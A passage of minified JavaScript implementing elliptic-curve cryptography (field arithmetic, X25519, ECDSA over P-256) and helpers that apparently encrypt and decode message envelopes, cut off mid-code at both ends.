c=n,l=o.pow(o.mul(o.ONE,i),r),u=o.pow(a,s),h=o.pow(a,r);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let d=1;for(let g=o.sqr(h);d<c&&!o.eql(g,o.ONE);d++)g=o.sqr(g);const f=o.pow(l,It<<BigInt(c-d-1));l=o.sqr(f),u=o.mul(u,f),h=o.mul(h,l),c=d}return u}}function RT(t){if(t%ry===TT){const e=(t+It)/ry;return function(r,n){const i=r.pow(n,e);if(!r.eql(r.sqr(i),n))throw new Error("Cannot find square root");return i}}if(t%I3===x3){const e=(t-x3)/I3;return function(r,n){const i=r.mul(n,Aa),s=r.pow(i,e),o=r.mul(n,s),a=r.mul(r.mul(o,Aa),s),c=r.mul(o,r.sub(a,r.ONE));if(!r.eql(r.sqr(c),n))throw new Error("Cannot find square root");return c}}return $T(t)}const DT=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function BT(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},r=DT.reduce((n,i)=>(n[i]="function",n),e);return uh(t,r)}function LT(t,e,r){if(r<Jt)throw new Error("invalid exponent, negatives unsupported");if(r===Jt)return t.ONE;if(r===It)return e;let n=t.ONE,i=e;for(;r>Jt;)r&It&&(n=t.mul(n,i)),i=t.sqr(i),r>>=It;return n}function UT(t,e){const r=new Array(e.length),n=e.reduce((s,o,a)=>t.is0(o)?s:(r[a]=s,t.mul(s,o)),t.ONE),i=t.inv(n);return e.reduceRight((s,o,a)=>t.is0(o)?s:(r[a]=t.mul(s,r[a]),t.mul(s,o)),i),r}function pC(t,e){const r=e!==void 0?e:t.toString(2).length,n=Math.ceil(r/8);return{nBitLength:r,nByteLength:n}}function gC(t,e,r=!1,n={}){if(t<=Jt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=pC(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:r,BITS:i,BYTES:s,MASK:Vb(i),ZERO:Jt,ONE:It,create:c=>Hr(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Jt<=c&&c<t},is0:c=>c===Jt,isOdd:c=>(c&It)===It,neg:c=>Hr(-c,t),eql:(c,l)=>c===l,sqr:c=>Hr(c*c,t),add:(c,l)=>Hr(c+l,t),sub:(c,l)=>Hr(c-l,t),mul:(c,l)=>Hr(c*l,t),pow:(c,l)=>LT(a,c,l),div:(c,l)=>Hr(c*ny(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>ny(c,t),sqrt:n.sqrt||(c=>(o||(o=RT(t)),o(a,c))),invertBatch:c=>UT(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>r?Gg(c,s):zu(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return r?Bd(c):oc(c)}});return Object.freeze(a)}function wC(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function mC(t){const e=wC(t);return e+Math.ceil(e/2)}function MT(t,e,r=!1){const n=t.length,i=wC(e),s=mC(e);if(n<16||n<s||n>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+n);const o=r?Bd(t):oc(t),a=Hr(o,e-It)+It;return r?Gg(a,i):zu(a,i)}const S3=BigInt(0),bp=BigInt(1);function X1(t,e){const r=e.negate();return t?r:e}function yC(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function ew(t,e){yC(t,e);const r=Math.ceil(e/t)+1,n=2**(t-1);return{windows:r,windowSize:n}}function FT(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((r,n)=>{if(!(r instanceof e))throw new Error("invalid point at index "+n)})}function zT(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((r,n)=>{if(!e.isValid(r))throw new Error("invalid scalar at index "+n)})}const tw=new WeakMap,bC=new WeakMap;function rw(t){return bC.get(t)||1}function jT(t,e){return{constTimeNegate:X1,hasPrecomputes(r){return rw(r)!==1},unsafeLadder(r,n,i=t.ZERO){let s=r;for(;n>S3;)n&bp&&(i=i.add(s)),s=s.double(),n>>=bp;return i},precomputeWindow(r,n){const{windows:i,windowSize:s}=ew(n,e),o=[];let a=r,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(r,n,i){const{windows:s,windowSize:o}=ew(r,e);let a=t.ZERO,c=t.BASE;const l=BigInt(2**r-1),u=2**r,h=BigInt(r);for(let d=0;d<s;d++){const f=d*o;let g=Number(i&l);i>>=h,g>o&&(g-=u,i+=bp);const p=f,w=f+Math.abs(g)-1,m=d%2!==0,b=g<0;g===0?c=c.add(X1(m,n[p])):a=a.add(X1(b,n[w]))}return{p:a,f:c}},wNAFUnsafe(r,n,i,s=t.ZERO){const{windows:o,windowSize:a}=ew(r,e),c=BigInt(2**r-1),l=2**r,u=BigInt(r);for(let h=0;h<o;h++){const d=h*a;if(i===S3)break;let f=Number(i&c);if(i>>=u,f>a&&(f-=l,i+=bp),f===0)continue;let g=n[d+Math.abs(f)-1];f<0&&(g=g.negate()),s=s.add(g)}return s},getPrecomputes(r,n,i){let s=tw.get(n);return s||(s=this.precomputeWindow(n,r),r!==1&&tw.set(n,i(s))),s},wNAFCached(r,n,i){const s=rw(r);return this.wNAF(s,this.getPrecomputes(s,r,i),n)},wNAFCachedUnsafe(r,n,i,s){const o=rw(r);return o===1?this.unsafeLadder(r,n,s):this.wNAFUnsafe(o,this.getPrecomputes(o,r,i),n,s)},setWindowSize(r,n){yC(n,e),bC.set(r,n),tw.delete(r)}}}function HT(t,e,r,n){if(FT(r,t),zT(n,e),r.length!==n.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=hC(BigInt(r.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),l=Math.floor((e.BITS-1)/o)*o;let u=i;for(let h=l;h>=0;h-=o){c.fill(i);for(let f=0;f<n.length;f++){const g=n[f],p=Number(g>>BigInt(h)&BigInt(a));c[p]=c[p].add(r[f])}let d=i;for(let f=c.length-1,g=i;f>0;f--)g=g.add(c[f]),d=d.add(g);if(u=u.add(d),h!==0)for(let f=0;f<o;f++)u=u.double()}return u}function vC(t){return BT(t.Fp),uh(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...pC(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const Vc=BigInt(0),nw=BigInt(1);function qT(t){return uh(t,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...t})}function VT(t){const e=qT(t),{P:r}=e,n=b=>Hr(b,r),i=e.montgomeryBits,s=Math.ceil(i/8),o=e.nByteLength,a=e.adjustScalarBytes||(b=>b),c=e.powPminus2||(b=>fC(b,r-BigInt(2),r));function l(b,v,x){const I=n(b*(v-x));return v=n(v-I),x=n(x+I),[v,x]}const u=(e.a-BigInt(2))/BigInt(4);function h(b,v){Bs("u",b,Vc,r),Bs("scalar",v,Vc,r);const x=v,I=b;let C=nw,N=Vc,S=b,P=nw,T=Vc,D;for(let V=BigInt(i-1);V>=Vc;V--){const O=x>>V&nw;T^=O,D=l(T,C,S),C=D[0],S=D[1],D=l(T,N,P),N=D[0],P=D[1],T=O;const y=C+N,E=n(y*y),k=C-N,_=n(k*k),R=E-_,L=S+P,q=S-P,W=n(q*y),Z=n(L*k),G=W+Z,ne=W-Z;S=n(G*G),P=n(I*n(ne*ne)),C=n(E*_),N=n(R*(E+n(u*R)))}D=l(T,C,S),C=D[0],S=D[1],D=l(T,N,P),N=D[0],P=D[1];const z=c(N);return n(C*z)}function d(b){return Gg(n(b),s)}function f(b){const v=dn("u coordinate",b,s);return o===32&&(v[31]&=127),Bd(v)}function g(b){const v=dn("scalar",b),x=v.length;if(x!==s&&x!==o){let I=""+s+" or "+o;throw new Error("invalid scalar, expected "+I+" bytes, got "+x)}return Bd(a(v))}function p(b,v){const x=f(v),I=g(b),C=h(x,I);if(C===Vc)throw new Error("invalid private or public key received");return d(C)}const w=d(e.Gu);function m(b){return p(b,w)}return{scalarMult:p,scalarMultBase:m,getSharedSecret:(b,v)=>p(b,v),getPublicKey:b=>m(b),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:w}}const iy=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const WT=BigInt(1),N3=BigInt(2),GT=BigInt(3),KT=BigInt(5);BigInt(8);function ZT(t){const e=BigInt(10),r=BigInt(20),n=BigInt(40),i=BigInt(80),s=iy,o=t*t%s*t%s,a=Xn(o,N3,s)*o%s,c=Xn(a,WT,s)*t%s,l=Xn(c,KT,s)*c%s,u=Xn(l,e,s)*l%s,h=Xn(u,r,s)*u%s,d=Xn(h,n,s)*h%s,f=Xn(d,i,s)*d%s,g=Xn(f,i,s)*d%s,p=Xn(g,e,s)*l%s;return{pow_p_5_8:Xn(p,N3,s)*t%s,b2:o}}function JT(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}const sy=VT({P:iy,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:t=>{const e=iy,{pow_p_5_8:r,b2:n}=ZT(t);return Hr(Xn(r,GT,e)*n,e)},adjustScalarBytes:JT,randomBytes:lh});function P3(t){t.lowS!==void 0&&Uu("lowS",t.lowS),t.prehash!==void 0&&Uu("prehash",t.prehash)}function QT(t){const e=vC(t);uh(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:r,Fp:n,a:i}=e;if(r){if(!n.eql(i,n.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof r!="object"||typeof r.beta!="bigint"||typeof r.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:YT,hexToBytes:XT}=_T;let e$=class extends Error{constructor(e=""){super(e)}};const ms={Err:e$,_tlv:{encode:(t,e)=>{const{Err:r}=ms;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length&1)throw new r("tlv.encode: unpadded data");const n=e.length/2,i=Rl(n);if(i.length/2&128)throw new r("tlv.encode: long form length too big");const s=n>127?Rl(i.length/2|128):"";return Rl(t)+s+i+e},decode(t,e){const{Err:r}=ms;let n=0;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length<2||e[n++]!==t)throw new r("tlv.decode: wrong tlv");const i=e[n++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new r("tlv.decode(long): indefinite length not supported");if(c>4)throw new r("tlv.decode(long): byte length is too big");const l=e.subarray(n,n+c);if(l.length!==c)throw new r("tlv.decode: length bytes not complete");if(l[0]===0)throw new r("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(n+=c,o<128)throw new r("tlv.decode(long): not minimal encoding")}const a=e.subarray(n,n+o);if(a.length!==o)throw new r("tlv.decode: wrong value length");return{v:a,l:e.subarray(n+o)}}},_int:{encode(t){const{Err:e}=ms;if(t<Ts)throw new e("integer: negative integers are not allowed");let r=Rl(t);if(Number.parseInt(r[0],16)&8&&(r="00"+r),r.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return r},decode(t){const{Err:e}=ms;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return YT(t)}},toSig(t){const{Err:e,_int:r,_tlv:n}=ms,i=typeof t=="string"?XT(t):t;qf(i);const{v:s,l:o}=n.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=n.decode(2,s),{v:l,l:u}=n.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:r.decode(a),s:r.decode(l)}},hexFromSig(t){const{_tlv:e,_int:r}=ms,n=e.encode(2,r.encode(t.r)),i=e.encode(2,r.encode(t.s)),s=n+i;return e.encode(48,s)}},Ts=BigInt(0),qt=BigInt(1);BigInt(2);const k3=BigInt(3);BigInt(4);function t$(t){const e=QT(t),{Fp:r}=e,n=gC(e.n,e.nBitLength),i=e.toBytes||((p,w,m)=>{const b=w.toAffine();return Ld(Uint8Array.from([4]),r.toBytes(b.x),r.toBytes(b.y))}),s=e.fromBytes||(p=>{const w=p.subarray(1),m=r.fromBytes(w.subarray(0,r.BYTES)),b=r.fromBytes(w.subarray(r.BYTES,2*r.BYTES));return{x:m,y:b}});function o(p){const{a:w,b:m}=e,b=r.sqr(p),v=r.mul(b,p);return r.add(r.add(v,r.mul(p,w)),m)}if(!r.eql(r.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(p){return Kg(p,qt,e.n)}function c(p){const{allowedPrivateKeyLengths:w,nByteLength:m,wrapPrivateKey:b,n:v}=e;if(w&&typeof p!="bigint"){if(vc(p)&&(p=Mu(p)),typeof p!="string"||!w.includes(p.length))throw new Error("invalid private key");p=p.padStart(m*2,"0")}let x;try{x=typeof p=="bigint"?p:oc(dn("private key",p,m))}catch{throw new Error("invalid private key, expected hex or "+m+" bytes, got "+typeof p)}return b&&(x=Hr(x,v)),Bs("private key",x,qt,v),x}function l(p){if(!(p instanceof d))throw new Error("ProjectivePoint expected")}const u=ty((p,w)=>{const{px:m,py:b,pz:v}=p;if(r.eql(v,r.ONE))return{x:m,y:b};const x=p.is0();w==null&&(w=x?r.ONE:r.inv(v));const I=r.mul(m,w),C=r.mul(b,w),N=r.mul(v,w);if(x)return{x:r.ZERO,y:r.ZERO};if(!r.eql(N,r.ONE))throw new Error("invZ was invalid");return{x:I,y:C}}),h=ty(p=>{if(p.is0()){if(e.allowInfinityPoint&&!r.is0(p.py))return;throw new Error("bad point: ZERO")}const{x:w,y:m}=p.toAffine();if(!r.isValid(w)||!r.isValid(m))throw new Error("bad point: x or y not FE");const b=r.sqr(m),v=o(w);if(!r.eql(b,v))throw new Error("bad point: equation left != right");if(!p.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class d{constructor(w,m,b){if(this.px=w,this.py=m,this.pz=b,w==null||!r.isValid(w))throw new Error("x required");if(m==null||!r.isValid(m))throw new Error("y required");if(b==null||!r.isValid(b))throw new Error("z required");Object.freeze(this)}static fromAffine(w){const{x:m,y:b}=w||{};if(!w||!r.isValid(m)||!r.isValid(b))throw new Error("invalid affine point");if(w instanceof d)throw new Error("projective point not allowed");const v=x=>r.eql(x,r.ZERO);return v(m)&&v(b)?d.ZERO:new d(m,b,r.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(w){const m=r.invertBatch(w.map(b=>b.pz));return w.map((b,v)=>b.toAffine(m[v])).map(d.fromAffine)}static fromHex(w){const m=d.fromAffine(s(dn("pointHex",w)));return m.assertValidity(),m}static fromPrivateKey(w){return d.BASE.multiply(c(w))}static msm(w,m){return HT(d,n,w,m)}_setWindowSize(w){g.setWindowSize(this,w)}assertValidity(){h(this)}hasEvenY(){const{y:w}=this.toAffine();if(r.isOdd)return!r.isOdd(w);throw new Error("Field doesn't support isOdd")}equals(w){l(w);const{px:m,py:b,pz:v}=this,{px:x,py:I,pz:C}=w,N=r.eql(r.mul(m,C),r.mul(x,v)),S=r.eql(r.mul(b,C),r.mul(I,v));return N&&S}negate(){return new d(this.px,r.neg(this.py),this.pz)}double(){const{a:w,b:m}=e,b=r.mul(m,k3),{px:v,py:x,pz:I}=this;let C=r.ZERO,N=r.ZERO,S=r.ZERO,P=r.mul(v,v),T=r.mul(x,x),D=r.mul(I,I),z=r.mul(v,x);return z=r.add(z,z),S=r.mul(v,I),S=r.add(S,S),C=r.mul(w,S),N=r.mul(b,D),N=r.add(C,N),C=r.sub(T,N),N=r.add(T,N),N=r.mul(C,N),C=r.mul(z,C),S=r.mul(b,S),D=r.mul(w,D),z=r.sub(P,D),z=r.mul(w,z),z=r.add(z,S),S=r.add(P,P),P=r.add(S,P),P=r.add(P,D),P=r.mul(P,z),N=r.add(N,P),D=r.mul(x,I),D=r.add(D,D),P=r.mul(D,z),C=r.sub(C,P),S=r.mul(D,T),S=r.add(S,S),S=r.add(S,S),new d(C,N,S)}add(w){l(w);const{px:m,py:b,pz:v}=this,{px:x,py:I,pz:C}=w;let N=r.ZERO,S=r.ZERO,P=r.ZERO;const T=e.a,D=r.mul(e.b,k3);let z=r.mul(m,x),V=r.mul(b,I),O=r.mul(v,C),y=r.add(m,b),E=r.add(x,I);y=r.mul(y,E),E=r.add(z,V),y=r.sub(y,E),E=r.add(m,v);let k=r.add(x,C);return E=r.mul(E,k),k=r.add(z,O),E=r.sub(E,k),k=r.add(b,v),N=r.add(I,C),k=r.mul(k,N),N=r.add(V,O),k=r.sub(k,N),P=r.mul(T,E),N=r.mul(D,O),P=r.add(N,P),N=r.sub(V,P),P=r.add(V,P),S=r.mul(N,P),V=r.add(z,z),V=r.add(V,z),O=r.mul(T,O),E=r.mul(D,E),V=r.add(V,O),O=r.sub(z,O),O=r.mul(T,O),E=r.add(E,O),z=r.mul(V,E),S=r.add(S,z),z=r.mul(k,E),N=r.mul(y,N),N=r.sub(N,z),z=r.mul(y,V),P=r.mul(k,P),P=r.add(P,z),new d(N,S,P)}subtract(w){return this.add(w.negate())}is0(){return this.equals(d.ZERO)}wNAF(w){return g.wNAFCached(this,w,d.normalizeZ)}multiplyUnsafe(w){const{endo:m,n:b}=e;Bs("scalar",w,Ts,b);const v=d.ZERO;if(w===Ts)return v;if(this.is0()||w===qt)return this;if(!m||g.hasPrecomputes(this))return g.wNAFCachedUnsafe(this,w,d.normalizeZ);let{k1neg:x,k1:I,k2neg:C,k2:N}=m.splitScalar(w),S=v,P=v,T=this;for(;I>Ts||N>Ts;)I&qt&&(S=S.add(T)),N&qt&&(P=P.add(T)),T=T.double(),I>>=qt,N>>=qt;return x&&(S=S.negate()),C&&(P=P.negate()),P=new d(r.mul(P.px,m.beta),P.py,P.pz),S.add(P)}multiply(w){const{endo:m,n:b}=e;Bs("scalar",w,qt,b);let v,x;if(m){const{k1neg:I,k1:C,k2neg:N,k2:S}=m.splitScalar(w);let{p:P,f:T}=this.wNAF(C),{p:D,f:z}=this.wNAF(S);P=g.constTimeNegate(I,P),D=g.constTimeNegate(N,D),D=new d(r.mul(D.px,m.beta),D.py,D.pz),v=P.add(D),x=T.add(z)}else{const{p:I,f:C}=this.wNAF(w);v=I,x=C}return d.normalizeZ([v,x])[0]}multiplyAndAddUnsafe(w,m,b){const v=d.BASE,x=(C,N)=>N===Ts||N===qt||!C.equals(v)?C.multiplyUnsafe(N):C.multiply(N),I=x(this,m).add(x(w,b));return I.is0()?void 0:I}toAffine(w){return u(this,w)}isTorsionFree(){const{h:w,isTorsionFree:m}=e;if(w===qt)return!0;if(m)return m(d,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:w,clearCofactor:m}=e;return w===qt?this:m?m(d,this):this.multiplyUnsafe(e.h)}toRawBytes(w=!0){return Uu("isCompressed",w),this.assertValidity(),i(d,this,w)}toHex(w=!0){return Uu("isCompressed",w),Mu(this.toRawBytes(w))}}d.BASE=new d(e.Gx,e.Gy,r.ONE),d.ZERO=new d(r.ZERO,r.ONE,r.ZERO);const f=e.nBitLength,g=jT(d,e.endo?Math.ceil(f/2):f);return{CURVE:e,ProjectivePoint:d,normPrivateKeyToScalar:c,weierstrassEquation:o,isWithinCurveOrder:a}}function r$(t){const e=vC(t);return uh(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function n$(t){const e=r$(t),{Fp:r,n}=e,i=r.BYTES+1,s=2*r.BYTES+1;function o(O){return Hr(O,n)}function a(O){return ny(O,n)}const{ProjectivePoint:c,normPrivateKeyToScalar:l,weierstrassEquation:u,isWithinCurveOrder:h}=t$({...e,toBytes(O,y,E){const k=y.toAffine(),_=r.toBytes(k.x),R=Ld;return Uu("isCompressed",E),E?R(Uint8Array.from([y.hasEvenY()?2:3]),_):R(Uint8Array.from([4]),_,r.toBytes(k.y))},fromBytes(O){const y=O.length,E=O[0],k=O.subarray(1);if(y===i&&(E===2||E===3)){const _=oc(k);if(!Kg(_,qt,r.ORDER))throw new Error("Point is not on curve");const R=u(_);let L;try{L=r.sqrt(R)}catch(W){const Z=W instanceof Error?": "+W.message:"";throw new Error("Point is not on curve"+Z)}const q=(L&qt)===qt;return(E&1)===1!==q&&(L=r.neg(L)),{x:_,y:L}}else if(y===s&&E===4){const _=r.fromBytes(k.subarray(0,r.BYTES)),R=r.fromBytes(k.subarray(r.BYTES,2*r.BYTES));return{x:_,y:R}}else{const _=i,R=s;throw new Error("invalid Point, expected length of "+_+", or uncompressed "+R+", got "+y)}}}),d=O=>Mu(zu(O,e.nByteLength));function f(O){const y=n>>qt;return O>y}function g(O){return f(O)?o(-O):O}const p=(O,y,E)=>oc(O.slice(y,E));class w{constructor(y,E,k){this.r=y,this.s=E,this.recovery=k,this.assertValidity()}static fromCompact(y){const E=e.nByteLength;return y=dn("compactSignature",y,E*2),new w(p(y,0,E),p(y,E,2*E))}static fromDER(y){const{r:E,s:k}=ms.toSig(dn("DER",y));return new w(E,k)}assertValidity(){Bs("r",this.r,qt,n),Bs("s",this.s,qt,n)}addRecoveryBit(y){return new w(this.r,this.s,y)}recoverPublicKey(y){const{r:E,s:k,recovery:_}=this,R=C(dn("msgHash",y));if(_==null||![0,1,2,3].includes(_))throw new Error("recovery id invalid");const L=_===2||_===3?E+e.n:E;if(L>=r.ORDER)throw new Error("recovery id 2 or 3 invalid");const q=(_&1)===0?"02":"03",W=c.fromHex(q+d(L)),Z=a(L),G=o(-R*Z),ne=o(k*Z),de=c.BASE.multiplyAndAddUnsafe(W,G,ne);if(!de)throw new Error("point at infinify");return de.assertValidity(),de}hasHighS(){return f(this.s)}normalizeS(){return this.hasHighS()?new w(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return Fu(this.toDERHex())}toDERHex(){return ms.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return Fu(this.toCompactHex())}toCompactHex(){return d(this.r)+d(this.s)}}const m={isValidPrivateKey(O){try{return l(O),!0}catch{return!1}},normPrivateKeyToScalar:l,randomPrivateKey:()=>{const O=mC(e.n);return MT(e.randomBytes(O),e.n)},precompute(O=8,y=c.BASE){return y._setWindowSize(O),y.multiply(BigInt(3)),y}};function b(O,y=!0){return c.fromPrivateKey(O).toRawBytes(y)}function v(O){const y=vc(O),E=typeof O=="string",k=(y||E)&&O.length;return y?k===i||k===s:E?k===2*i||k===2*s:O instanceof c}function x(O,y,E=!0){if(v(O))throw new Error("first arg must be private key");if(!v(y))throw new Error("second arg must be public key");return c.fromHex(y).multiply(l(O)).toRawBytes(E)}const I=e.bits2int||function(O){if(O.length>8192)throw new Error("input is too large");const y=oc(O),E=O.length*8-e.nBitLength;return E>0?y>>BigInt(E):y},C=e.bits2int_modN||function(O){return o(I(O))},N=Vb(e.nBitLength);function S(O){return Bs("num < 2^"+e.nBitLength,O,Ts,N),zu(O,e.nByteLength)}function P(O,y,E=T){if(["recovered","canonical"].some(Ne=>Ne in E))throw new Error("sign() legacy options not supported");const{hash:k,randomBytes:_}=e;let{lowS:R,prehash:L,extraEntropy:q}=E;R==null&&(R=!0),O=dn("msgHash",O),P3(E),L&&(O=dn("prehashed msgHash",k(O)));const W=C(O),Z=l(y),G=[S(Z),S(W)];if(q!=null&&q!==!1){const Ne=q===!0?_(r.BYTES):q;G.push(dn("extraEntropy",Ne))}const ne=Ld(...G),de=W;function Se(Ne){const be=I(Ne);if(!h(be))return;const ke=a(be),Me=c.BASE.multiply(be).toAffine(),Ue=o(Me.x);if(Ue===Ts)return;const Le=o(ke*o(de+Ue*Z));if(Le===Ts)return;let wt=(Me.x===Ue?0:2)|Number(Me.y&qt),bn=Le;return R&&f(Le)&&(bn=g(Le),wt^=1),new w(Ue,bn,wt)}return{seed:ne,k2sig:Se}}const T={lowS:e.lowS,prehash:!1},D={lowS:e.lowS,prehash:!1};function z(O,y,E=T){const{seed:k,k2sig:_}=P(O,y,E),R=e;return dC(R.hash.outputLen,R.nByteLength,R.hmac)(k,_)}c.BASE._setWindowSize(8);function V(O,y,E,k=D){var Le;const _=O;y=dn("msgHash",y),E=dn("publicKey",E);const{lowS:R,prehash:L,format:q}=k;if(P3(k),"strict"in k)throw new Error("options.strict was renamed to lowS");if(q!==void 0&&q!=="compact"&&q!=="der")throw new Error("format must be compact or der");const W=typeof _=="string"||vc(_),Z=!W&&!q&&typeof _=="object"&&_!==null&&typeof _.r=="bigint"&&typeof _.s=="bigint";if(!W&&!Z)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let G,ne;try{if(Z&&(G=new w(_.r,_.s)),W){try{q!=="compact"&&(G=w.fromDER(_))}catch(wt){if(!(wt instanceof ms.Err))throw wt}!G&&q!=="der"&&(G=w.fromCompact(_))}ne=c.fromHex(E)}catch{return!1}if(!G||R&&G.hasHighS())return!1;L&&(y=e.hash(y));const{r:de,s:Se}=G,Ne=C(y),be=a(Se),ke=o(Ne*be),Me=o(de*be),Ue=(Le=c.BASE.multiplyAndAddUnsafe(ne,ke,Me))==null?void 0:Le.toAffine();return Ue?o(Ue.x)===de:!1}return{CURVE:e,getPublicKey:b,getSharedSecret:x,sign:z,verify:V,ProjectivePoint:c,Signature:w,utils:m}}function i$(t){return{hash:t,hmac:(e,...r)=>qg(t,e,c_(...r)),randomBytes:lh}}function s$(t,e){const r=n=>n$({...t,...i$(n)});return{...r(e),create:r}}const EC=gC(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff")),o$=EC.create(BigInt("-3")),a$=BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),c$=s$({a:o$,b:a$,Fp:EC,n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),h:BigInt(1),lowS:!1},Hf),CC="base10",kr="base16",ui="base64pad",fo="base64url",Vf="utf8",AC=0,Ls=1,Wf=2,l$=0,O3=1,vd=12,Wb=32;function u$(){const t=sy.utils.randomPrivateKey(),e=sy.getPublicKey(t);return{privateKey:Kr(t,kr),publicKey:Kr(e,kr)}}function oy(){const t=lh(Wb);return Kr(t,kr)}function h$(t,e){const r=sy.getSharedSecret(zn(t,kr),zn(e,kr)),n=gT(Hf,r,void 0,void 0,Wb);return Kr(n,kr)}function _0(t){const e=Hf(zn(t,kr));return Kr(e,kr)}function Fi(t){const e=Hf(zn(t,Vf));return Kr(e,kr)}function xC(t){return zn(`${t}`,CC)}function Ec(t){return Number(Kr(t,CC))}function IC(t){return t.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function SC(t){const e=t.replace(/-/g,"+").replace(/_/g,"/"),r=(4-e.length%4)%4;return e+"=".repeat(r)}function d$(t){const e=xC(typeof t.type<"u"?t.type:AC);if(Ec(e)===Ls&&typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const r=typeof t.senderPublicKey<"u"?zn(t.senderPublicKey,kr):void 0,n=typeof t.iv<"u"?zn(t.iv,kr):lh(vd),i=zn(t.symKey,kr),s=lC(i,n).encrypt(zn(t.message,Vf)),o=NC({type:e,sealed:s,iv:n,senderPublicKey:r});return t.encoding===fo?IC(o):o}function f$(t){const e=zn(t.symKey,kr),{sealed:r,iv:n}=Ud({encoded:t.encoded,encoding:t.encoding}),i=lC(e,n).decrypt(r);if(i===null)throw new Error("Failed to decrypt");return Kr(i,Vf)}function p$(t,e){const r=xC(Wf),n=lh(vd),i=zn(t,Vf),s=NC({type:r,sealed:i,iv:n});return e===fo?IC(s):s}function g$(t,e){const{sealed:r}=Ud({encoded:t,encoding:e});return Kr(r,Vf)}function NC(t){if(Ec(t.type)===Wf)return Kr(bd([t.type,t.sealed]),ui);if(Ec(t.type)===Ls){if(typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return Kr(bd([t.type,t.senderPublicKey,t.iv,t.sealed]),ui)}return Kr(bd([t.type,t.iv,t.sealed]),ui)}function Ud(t){const e=(t.encoding||ui)===fo?SC(t.encoded):t.encoded,r=zn(e,ui),n=r.slice(l$,O3),i=O3;if(Ec(n)===Ls){const c=i+Wb,l=c+vd,u=r.slice(i,c),h=r.slice(c,l),d=r.slice(l);return{type:n,sealed:d,iv:h,senderPublicKey:u}}if(Ec(n)===Wf){const c=r.slice(i),l=lh(vd);return{type:n,sealed:c,iv:l}}const s=i+vd,o=r.slice(i,s),a=r.slice(s);return{type:n,sealed:a,iv:o}}function w$(t,e){const r=Ud({encoded:t,encoding:e==null?void 0:e.encoding});return PC({type:Ec(r.type),senderPublicKey:typeof 